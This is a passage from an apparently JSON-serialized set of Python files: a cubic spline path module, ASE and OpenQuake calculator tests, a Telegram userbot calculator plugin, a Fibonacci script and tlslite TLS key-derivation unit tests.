if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        u\"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        u\"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        u\"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        u\"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        #  print(B)\n        return B\n\n\nclass Spline2D:\n    u\"\"\"\n    2D Cubic Spline class\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = [math.sqrt(idx ** 2 + idy ** 2)\n                   for (idx, idy) in zip(dx, dy)]\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        u\"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        u\"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / (dx ** 2 + dy ** 2)\n        return k\n\n    def calc_yaw(self, s):\n        u\"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], 0.1)\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    flg, ax = plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    flg, ax = plt.subplots(1)\n    plt.plot(s, [math.degrees(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    flg, ax = plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "495": "import pytest\n\nfrom ase.build import bulk\nfrom ase.utils import tokenize_version\n\n\n@pytest.mark.skip('test is rather broken')\ndef test_dftb_bandstructure(dftb_factory):\n    # We need to get the DFTB+ version to know\n    # whether to skip this test or not.\n    # For this, we need to run DFTB+ and grep\n    # the version from the output header.\n    # cmd = os.environ['ASE_DFTB_COMMAND'].split()[0]\n    # cmd = dftb_factory.ex\n    version = dftb_factory.version()\n    if tokenize_version(version) < tokenize_version('17.1'):\n        pytest.skip('Band structure requires DFTB 17.1+')\n\n    calc = dftb_factory.calc(\n        label='dftb',\n        kpts=(3, 3, 3),\n        Hamiltonian_SCC='Yes',\n        Hamiltonian_SCCTolerance=1e-5,\n        Hamiltonian_MaxAngularMomentum_Si='d'\n    )\n\n    atoms = bulk('Si')\n    atoms.calc = calc\n    atoms.get_potential_energy()\n\n    efermi = calc.get_fermi_level()\n    assert abs(efermi - -2.90086680996455) < 1.\n\n    # DOS does not currently work because of\n    # missing \"get_k_point_weights\" function\n    #from ase.dft.dos import DOS\n    #dos = DOS(calc, width=0.2)\n    #d = dos.get_dos()\n    #e = dos.get_energies()\n    #print(d, e)\n\n    calc = dftb_factory.calc(\n        atoms=atoms,\n        label='dftb',\n        kpts={'path': 'WGXWLG', 'npoints': 50},\n        Hamiltonian_SCC='Yes',\n        Hamiltonian_MaxSCCIterations=1,\n        Hamiltonian_ReadInitialCharges='Yes',\n        Hamiltonian_MaxAngularMomentum_Si='d'\n    )\n\n    atoms.calc = calc\n    calc.calculate(atoms)\n\n    #calc.results['fermi_levels'] = [efermi]\n    calc.band_structure()\n    # Maybe write the band structure or assert something?\n", "496": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "497": "def fib(n, calc):\n    if n == 0 or n == 1:\n        if len(calc) < 2:\n            calc.append(n)\n        return calc[n], calc\n\n    elif len(calc)-1 >= n:\n        return calc[n], calc\n\n    elif n >= 2:\n        res1, c = fib(n-1, calc)\n        res2, c = fib(n-2, calc)\n        res = res1 + res2\n        calc.append(res)\n        return res, calc\n    else:\n        return calc[n], calc\n\n\na = int(input())\nres = ''\ncalc = []\nfor num in range(0, a):\n    n, calc = fib(num, calc)\n    res += str(n) + ' '\n\nprint(res.strip())\n", "498": "# -*- coding: utf-8 -*-\n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n# Copyright (C) 2015-2022 GEM Foundation\n#\n# OpenQuake is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Affero General Public License as published\n# by the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# OpenQuake is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Affero General Public License for more details.\n#\n# You should have received a copy of the GNU Affero General Public License\n# along with OpenQuake. If not, see .\n\nimport numpy\nimport unittest\nfrom openquake.qa_tests_data.scenario_risk import (\n    case_1, case_2, case_2d, case_1g, case_1h, case_3, case_4, case_5,\n    case_6a, case_7, case_8, case_10, occupants, case_master,\n    case_shakemap, case_shapefile)\n\nfrom openquake.baselib.general import gettemp\nfrom openquake.hazardlib import InvalidFile\nfrom openquake.hazardlib.gsim_lt import InvalidLogicTree\nfrom openquake.calculators.tests import CalculatorTestCase\nfrom openquake.calculators.views import view\nfrom openquake.calculators.export import export\nfrom openquake.calculators.extract import extract\n\naac = numpy.testing.assert_allclose\n\n\ndef tot_loss(dstore):\n    return dstore.read_df('aggrisk').loss.sum() / 2\n\n\nclass ScenarioRiskTestCase(CalculatorTestCase):\n\n    def test_case_1(self):\n        out = self.run_calc(case_1.__file__, 'job_risk.ini', exports='csv')\n        [fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agg.csv', fname)\n\n        # check the exported GMFs\n        [fname, sitefile] = export(('gmf_data', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/gmf-FromFile.csv', fname)\n        self.assertEqualFiles('expected/sites.csv', sitefile)\n\n        [fname] = export(('risk_by_event', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/risk_by_event.csv', fname)\n\n    def test_case_2(self):\n        out = self.run_calc(case_2.__file__, 'job_risk.ini', exports='csv')\n        [fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agg.csv', fname)\n\n    def test_case_2d(self):\n        # time_event not specified in job_h.ini but specified in job_r.ini\n        out = self.run_calc(case_2d.__file__, 'job_h.ini,job_r.ini',\n                            exports='csv')\n        # this is also a case with a single site but an exposure grid,\n        # to test a corner case\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles(\n            'expected/losses_by_asset.csv', fname, delta=1E-5)\n\n        # test agglosses\n        tot = extract(self.calc.datastore, 'agg_losses/occupants')\n        aac(tot.array, [0.03104], atol=2E-5)\n\n        # test agglosses with *\n        tbl = extract(self.calc.datastore, 'agg_losses/occupants?taxonomy=*')\n        self.assertEqual(tbl.array.shape, (1, 1))  # 1 taxonomy, 1 rlz\n\n    def test_case_3(self):\n        # a4 has a missing cost\n        out = self.run_calc(case_3.__file__, 'job.ini', exports='csv')\n\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles('expected/asset-loss.csv', fname)\n\n        [fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agg_loss.csv', fname, delta=5E-6)\n\n    def test_case_4(self):\n        # this test is sensitive to the ordering of the epsilons\n        out = self.run_calc(case_4.__file__, 'job.ini', exports='csv')\n        fname = gettemp(view('totlosses', self.calc.datastore))\n        self.assertEqualFiles('expected/totlosses.txt', fname)\n\n        [fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agglosses.csv', fname, delta=1E-5)\n\n    def test_occupants(self):\n        out = self.run_calc(occupants.__file__, 'job_haz.ini,job_risk.ini',\n                            exports='csv')\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles('expected/asset-loss.csv', fname)\n\n        [fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agg_loss.csv', fname, delta=1E-5)\n\n    def test_case_5(self):\n        # case with site model and 11 sites filled out of 17\n        out = self.run_calc(case_5.__file__, 'job.ini', exports='csv')\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles('expected/losses_by_asset.csv', fname,\n                              delta=1E-5)  # make macos happy\n\n        # TODO: check pandas\n        # df = self.calc.datastore.read_df('avg_losses-rlzs', 'asset_id')\n        # self.assertEqual(list(df.columns), ['rlz', 'loss_type', 'value'])\n\n    def test_case_6a(self):\n        # case with two gsims\n        self.run_calc(case_6a.__file__, 'job_haz.ini,job_risk.ini',\n                      exports='csv')\n        [f] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk.csv', f, delta=5E-5)\n\n        # testing the totlosses view\n        dstore = self.calc.datastore\n        fname = gettemp(view('totlosses', dstore))\n        self.assertEqualFiles('expected/totlosses.txt', fname, delta=5E-5)\n\n        # testing portfolio_losses\n        fname = gettemp(view('portfolio_losses', dstore))\n        self.assertEqualFiles('expected/portfolio_losses.txt', fname,\n                              delta=5E-5)\n\n        # two equal gsims\n        with self.assertRaises(InvalidLogicTree):\n            self.run_calc(case_6a.__file__, 'job_haz.ini',\n                          gsim_logic_tree_file='wrong_gmpe_logic_tree.xml')\n\n    def test_case_1g(self):\n        out = self.run_calc(case_1g.__file__, 'job_haz.ini,job_risk.ini',\n                            exports='csv')\n        [_tot, fname] = out['aggrisk', 'csv']\n        self.assertEqualFiles('expected/agg-gsimltp_@.csv', fname)\n\n    def test_case_1h(self):\n        # this is a case with 2 assets spawning 2 tasks\n        out = self.run_calc(case_1h.__file__, 'job.ini', exports='csv')\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles('expected/losses_by_asset.csv', fname)\n\n        # with a single task\n        out = self.run_calc(case_1h.__file__, 'job.ini', exports='csv',\n                            concurrent_tasks='0')\n        [fname] = out['avg_losses-rlzs', 'csv']\n        self.assertEqualFiles('expected/losses_by_asset.csv', fname)\n\n    def test_case_master(self):\n        # a case with two GSIMs\n        self.run_calc(case_master.__file__, 'job.ini', exports='npz')\n\n        # check realizations\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n\n        # extract losses by taxonomy\n        extract(self.calc.datastore, 'agg_losses/structural?'\n                'taxonomy=*').array  # shape (T, R) = (3, 2)\n\n        # extract agglosses with a * and a selection\n        obj = extract(self.calc.datastore, 'agg_losses/structural?'\n                      'state=*&cresta=0.11')\n        self.assertEqual(obj.selected, [b'state=*', b'cresta=0.11'])\n        self.assertEqual(obj.tags, [b'state=01'])\n        aac(obj.array, [[2764.5]], atol=.02)  # from avg_losses-stats\n\n        # check portfolio_loss\n        fname = gettemp(view('portfolio_loss', self.calc.datastore))\n        # sensitive to shapely version\n        self.assertEqualFiles('expected/portfolio_loss.txt', fname, delta=1E-4)\n\n    def test_collapse_gsim_logic_tree(self):\n        self.run_calc(case_master.__file__, 'job.ini',\n                      collapse_gsim_logic_tree='bs1')\n        fname = gettemp(view('portfolio_loss', self.calc.datastore))\n        self.assertEqualFiles(\n            'expected/portfolio_loss2.txt', fname, delta=1E-5)\n\n    def test_case_7(self):\n        # check independence from concurrent_tasks\n        self.run_calc(case_7.__file__, 'job.ini', concurrent_tasks='10')\n        tot10 = tot_loss(self.calc.datastore)\n        self.run_calc(case_7.__file__, 'job.ini', concurrent_tasks='20')\n        tot20 = tot_loss(self.calc.datastore)\n        aac(tot10, tot20, atol=.0001)  # must be around 230.0107\n\n        # check aggregate_by site_id\n        [_tot, fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/agglosses.csv', fname)\n\n    def test_case_8(self):\n        # a complex scenario_risk from GMFs where the hazard sites are\n        # not in the asset locations\n        self.run_calc(case_8.__file__, 'job.ini')\n        [_tot, fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/agglosses.csv', fname)\n\n        agglosses = extract(self.calc.datastore, 'agg_losses/structural')\n        aac(agglosses.array, [1159325.6])\n\n        # make sure the fullreport can be extracted\n        view('fullreport', self.calc.datastore)\n\n    def test_case_10(self):\n        # missing occupants in the exposure\n        with self.assertRaises(InvalidFile):\n            self.run_calc(case_10.__file__, 'job.ini')\n\n    def test_case_shakemap(self):\n        self.run_calc(case_shakemap.__file__, 'pre-job.ini')\n        self.run_calc(case_shakemap.__file__, 'job.ini',\n                      hazard_calculation_id=str(self.calc.datastore.calc_id))\n        sitecol = self.calc.datastore['sitecol']\n        self.assertEqual(len(sitecol), 9)\n        gmfdict = dict(extract(self.calc.datastore, 'gmf_data'))\n        gmfa = gmfdict['rlz-000']\n        self.assertEqual(gmfa.shape, (9,))\n        self.assertEqual(\n            gmfa.dtype.names,\n            ('custom_site_id', 'lon', 'lat', 'PGA', 'SA(0.3)', 'SA(1.0)'))\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/agglosses.csv', fname)\n\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n\n    def test_case_shapefile(self):\n        try:\n            import shapefile\n        except ImportError:\n            raise unittest.SkipTest('Missing pyshp')\n        self.run_calc(case_shapefile.__file__, 'prepare_job.ini')\n        pre_id = str(self.calc.datastore.calc_id)\n        self.run_calc(case_shapefile.__file__, 'job.ini',\n                      hazard_calculation_id=pre_id)\n        sitecol = self.calc.datastore['sitecol']\n        self.assertEqual(len(sitecol), 7)\n        gmfdict = dict(extract(self.calc.datastore, 'gmf_data'))\n        gmfa = gmfdict['rlz-000']\n        self.assertEqual(gmfa.shape, (7,))\n        self.assertEqual(gmfa.dtype.names,\n                         ('custom_site_id', 'lon', 'lat', 'MMI'))\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/agglosses.csv', fname)\n\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n\n        # also test case if shapefiles are together in a zip file\n        self.run_calc(case_shapefile.__file__, 'job_zipped.ini',\n                      hazard_calculation_id=pre_id)\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n", "499": "# Copyright (c) 2014, Hubert Kario\n#\n# See the LICENSE file for legal information regarding use of this file.\n\n# compatibility with Python 2.6, for that we need unittest2 package,\n# which is not available on 3.3 or 3.4\ntry:\n        import unittest2 as unittest\nexcept ImportError:\n        import unittest\n\nfrom tlslite.mathtls import PRF_1_2, calcMasterSecret, calcFinished, \\\n        calcExtendedMasterSecret, paramStrength\nfrom tlslite.handshakehashes import HandshakeHashes\nfrom tlslite.constants import CipherSuite\n\nclass TestCalcMasterSecret(unittest.TestCase):\n    def test_with_empty_values(self):\n        ret = calcMasterSecret((3, 3), 0, bytearray(48), bytearray(32),\n                               bytearray(32))\n\n        self.assertEqual(bytearray(\n            b'I\\xcf\\xae\\xe5[\\x86\\x92\\xd3\\xbbm\\xd6\\xeekSo/' +\n            b'\\x17\\xaf\\xbc\\x84\\x18\\tGc\\xbc\\xb5\\xbe\\xd6\\xb0\\x05\\xad\\xf8' +\n            b'\\x88\\xd0`\\xe4\\x8c^\\xb2&ls\\xcb\\x1a=-Kh'\n            ), ret)\n        self.assertEqual(48, len(ret))\n\nclass TestCalcExtendedMasterSecret(unittest.TestCase):\n    def setUp(self):\n        self.handshakeHashes = HandshakeHashes()\n        self.handshakeHashes.update(bytearray(48))\n\n    def test_with_TLS_1_0(self):\n        ret = calcExtendedMasterSecret((3, 1),\n                                       0,\n                                       bytearray(48),\n                                       self.handshakeHashes)\n        self.assertEqual(ret, bytearray(\n            b'/\\xe9\\x86\\xda\\xda\\xa9)\\x1eyJ\\xc9\\x13E\\xe4\\xfc\\xe7\\x842m7(\\xb4'\n            b'\\x98\\xb7\\xbc\\xa5\\xda\\x1d\\xf3\\x15\\xea\\xdf:i\\xeb\\x9bA\\x8f\\xe7'\n            b'\\xd4<\\xe0\\xe8\\x1d\\xa0\\xf0\\x10\\x83'\n            ))\n\n    def test_with_TLS_1_2(self):\n        ret = calcExtendedMasterSecret((3, 3),\n                                       0,\n                                       bytearray(48),\n                                       self.handshakeHashes)\n        self.assertEqual(ret, bytearray(\n            b'\\x03\\xc93Yx\\xcbjSEmz*\\x0b\\xc3\\xc04G\\xf3\\xe3{\\xee\\x13\\x8b\\xac'\n            b'\\xd7\\xb7\\xe6\\xbaY\\x86\\xd5\\xf2o?\\x8f\\xc6\\xf2\\x19\\x1d\\x06\\xe0N'\n            b'\\xb5\\xcaJX\\xe8\\x1d'\n            ))\n\n    def test_with_TLS_1_2_and_SHA384_PRF(self):\n        ret = calcExtendedMasterSecret((3, 3),\n                                       CipherSuite.\n                                       TLS_RSA_WITH_AES_256_GCM_SHA384,\n                                       bytearray(48),\n                                       self.handshakeHashes)\n        self.assertEqual(ret, bytearray(\n            b\"\\xd6\\xed}K\\xfbo\\xb2\\xdb\\xa4\\xee\\xa1\\x0f\\x8f\\x07*\\x84w/\\xbf_\"\n            b\"\\xbd\\xc1U^\\x93\\xcf\\xe8\\xca\\x82\\xb7_B\\xa3O\\xd9V\\x86\\x12\\xfd\\x08\"\n            b\"$\\x92\\'L\\xae\\xc0@\\x01\"\n            ))\n\nclass TestPRF1_2(unittest.TestCase):\n    def test_with_bogus_values(self):\n        ret = PRF_1_2(bytearray(1), b\"key expansion\", bytearray(1), 10)\n\n        self.assertEqual(bytearray(b'\\xaa2\\xca\\r\\x8b\\x85N\\xad?\\xab'), ret)\n\n    def test_with_realistic_values(self):\n        ret = PRF_1_2(bytearray(48), b\"key expansion\", bytearray(64), 16)\n\n        self.assertEqual(bytearray(b'S\\xb5\\xdb\\xc8T }u)BxuB\\xe4\\xeb\\xeb'), ret)\n\nclass TestCalcFinished(unittest.TestCase):\n    def setUp(self):\n        self.hhashes = HandshakeHashes()\n        self.hhashes.update(bytearray(10))\n\nclass TestCalcFinishedInSSL3(TestCalcFinished):\n    def setUp(self):\n        super(TestCalcFinishedInSSL3, self).setUp()\n\n        self.finished = calcFinished((3, 0),\n                                     bytearray(48),\n                                     0,\n                                     self.hhashes,\n                                     True)\n    def test_client_value(self):\n        self.assertEqual(bytearray(\n            b'\\x15\\xa9\\xd7\\xf1\\x8bV\\xecY\\xab\\xee\\xbaS\\x9c}\\xffW\\xa0'+\n            b'\\xa8\\\\q\\xe5x8\"\\xf4\\xedp\\xabl\\x8aV\\xd9G\\xab\\x0fz'),\n            self.finished)\n\n    def test_server_value(self):\n        ret = calcFinished((3, 0), bytearray(48), 0, self.hhashes, False)\n\n        self.assertEqual(bytearray(\n            b'\\xe3^aCb\\x8a\\xfc\\x98\\xbf\\xd7\\x08\\xddX\\xdc[\\xeac\\x02\\xdb'+\n            b'\\x9b\\x8aN\\xed\\xed\\xaaZ\\xcb\\xda\"\\x87K\\xff\\x89m\\xa9/'),\n            ret)\n\n    def test_if_multiple_runs_are_the_same(self):\n        ret2 = calcFinished((3, 0), bytearray(48), 0, self.hhashes, True)\n\n        self.assertEqual(self.finished, ret2)\n\n    def test_if_client_and_server_values_differ(self):\n        ret_srv = calcFinished((3, 0), bytearray(48), 0, self.hhashes, False)\n\n        self.assertNotEqual(self.finished, ret_srv)\n\nclass TestCalcFinishedInTLS1_0(TestCalcFinished):\n    def setUp(self):\n        super(TestCalcFinishedInTLS1_0, self).setUp()\n\n        self.finished = calcFinished((3, 1),\n                                     bytearray(48),\n                                     0,\n                                     self.hhashes,\n                                     True)\n\n    def test_client_value(self):\n        self.assertEqual(12, len(self.finished))\n        self.assertEqual(bytearray(\n            b'\\xf8N\\x8a\\x8dx\\xb8\\xfe\\x9e1\\x0b\\x8a#'),\n            self.finished)\n\n    def test_server_value(self):\n        ret_srv = calcFinished((3, 1), bytearray(48), 0, self.hhashes, False)\n\n        self.assertEqual(12, len(ret_srv))\n        self.assertEqual(bytearray(\n            b'kYB\\xce \\x7f\\xbb\\xee\\xe5\\xe7<\\x9d'),\n            ret_srv)\n\n    def test_if_client_and_server_values_differ(self):\n        ret_srv = calcFinished((3, 1), bytearray(48), 0, self.hhashes, False)\n\n        self.assertNotEqual(self.finished, ret_srv)\n\n    def test_if_values_for_TLS1_0_and_TLS1_0_are_same(self):\n        ret = calcFinished((3, 2), bytearray(48), 0, self.hhashes, True)\n\n        self.assertEqual(self.finished, ret)\n\nclass TestCalcFinishedInTLS1_2WithSHA256(TestCalcFinished):\n    def setUp(self):\n        super(TestCalcFinishedInTLS1_2WithSHA256, self).setUp()\n\n        self.finished = calcFinished((3, 3),\n                                     bytearray(48),\n                                     0,\n                                     self.hhashes,\n                                     True)\n\n    def test_client_value(self):\n        self.assertEqual(12, len(self.finished))\n        self.assertEqual(bytearray(\n            b'\\x8e\\x8c~\\x03lU$S\\x9fz\\\\\\xcc'),\n            self.finished)\n\n    def test_server_value(self):\n        ret_srv = calcFinished((3, 3), bytearray(48), 0, self.hhashes, False)\n\n        self.assertEqual(12, len(self.finished))\n        self.assertEqual(bytearray(\n            b'\\xa8\\xf1\\xdf8s|\\xedU\\\\Z=U'),\n            ret_srv)\n\n    def test_if_client_and_server_values_differ(self):\n       ret_srv = calcFinished((3, 3), bytearray(48), 0, self.hhashes, False)\n\n       self.assertNotEqual(ret_srv, self.finished)\n\nclass TestCalcFinishedInTLS1_2WithSHA384(TestCalcFinished):\n    def setUp(self):\n        super(TestCalcFinishedInTLS1_2WithSHA384, self).setUp()\n\n        self.finished = calcFinished((3, 3),\n                                     bytearray(48),\n                                     CipherSuite.TLS_RSA_WITH_AES_256_GCM_SHA384,\n                                     self.hhashes,\n                                     True)\n\n    def test_client_value(self):\n        self.assertEqual(12, len(self.finished))\n        self.assertEqual(bytearray(\n            b'UB\\xeeq\\x86\\xa5\\x88L \\x04\\x893'),\n            self.finished)\n\n    def test_server_value(self):\n        ret_srv = calcFinished((3, 3), bytearray(48),\n                               CipherSuite.TLS_RSA_WITH_AES_256_GCM_SHA384,\n                               self.hhashes, False)\n        self.assertEqual(bytearray(\n            b'\\x02St\\x13\\xa8\\xe6\\xb6\\xa2\\x1c4\\xff\\xc5'),\n            ret_srv)\n\n    def test_if_client_and_server_values_differ(self):\n        ret_srv = calcFinished((3, 3), bytearray(48),\n                               CipherSuite.TLS_RSA_WITH_AES_256_GCM_SHA384,\n                               self.hhashes, False)\n        self.assertNotEqual(self.finished, ret_srv)\n\n\nclass TestParamStrength(unittest.TestCase):\n    def test_480(self):\n        self.assertEqual(48, paramStrength(2**480))\n\n    def test_512(self):\n        self.assertEqual(56, paramStrength(2**512))\n\n    def test_768(self):\n        self.assertEqual(64, paramStrength(2**768))\n\n    def test_900(self):\n        self.assertEqual(72, paramStrength(2**900))\n\n    def test_1024(self):\n        self.assertEqual(80, paramStrength(2**1024))\n\n    def test_1536(self):\n        self.assertEqual(88, paramStrength(2**1536))\n\n    def test_2048(self):\n        self.assertEqual(112, paramStrength(2**2048))\n\n    def test_3072(self):\n        self.assertEqual(128, paramStrength(2**3072))\n\n    def test_4096(self):\n        self.assertEqual(152, paramStrength(2**4096))\n\n    def test_6144(self):\n        self.assertEqual(168, 